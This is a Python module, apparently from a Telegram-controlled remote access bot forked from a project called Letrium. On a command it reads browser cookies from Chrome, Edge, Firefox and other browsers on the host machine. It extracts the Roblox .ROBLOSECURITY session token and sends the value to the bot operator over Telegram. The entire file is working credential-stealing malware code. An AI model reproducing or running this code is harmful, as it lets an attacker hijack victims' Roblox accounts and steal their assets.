##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/

# forked from https://github.com/cybermads/Letrium.git
# author: cyberman

from aiogram import types, F
from aiogram.filters import Command
from config import ALLOWED_USER_ID

import browser_cookie3

PATHS = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]

 
def register_roblosecurity_handler(dp):
    @dp.message(F.text.lower() == "роблокс куки")
    @dp.message(Command("robloxcookie"))
    async def ROBLOSECURITY(message: types.Message):
        if message.from_user.id == ALLOWED_USER_ID:
            for local in PATHS:
                try:
                    cookies = getattr(browser_cookie3, local)(domain_name='roblox.com')
                    for cookie in cookies:
                        if cookie.name == '.ROBLOSECURITY':
                            await message.answer(f"ROBLOSECURITY: `{cookie.value}`", parse_mode="Markdown")
                            return
                except Exception as e:
                    continue
            await message.answer("Не удалось найти ROBLOSECURITY куки.")
        else:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")
            
        